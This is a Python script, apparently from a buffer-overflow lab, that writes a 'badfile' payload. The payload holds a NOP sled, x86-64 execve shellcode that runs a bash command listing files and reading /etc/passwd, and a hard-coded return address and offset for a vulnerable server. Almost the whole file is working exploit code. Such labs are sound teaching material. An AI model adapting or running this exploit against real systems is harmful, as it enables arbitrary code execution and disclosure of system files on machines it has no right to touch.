#!/usr/bin/python3
import sys

shellcode= (
  "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
  "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
  "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
  "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd          *"
  "AAAAAAAA" # Placeholder for argv[0] --> "/bin/bash"
  "BBBBBBBB" # Placeholder for argv[1] --> "-c"
  "CCCCCCCC" # Placeholder for argv[2] --> the command string
  "DDDDDDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
content[517 - len(shellcode):] = shellcode

# there is a dummy stack frame between bof and main, which size is about 1000 bytes. We can thus add 1200 bytes to the base pointer address 
ret    = 0x00007fffffffe0e0 + 1200    # 0x00007fffffffe0e0 is the buffer address printed by the server
offset = 96 + 8  #96 is the offset between the base pointer and the buffer

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
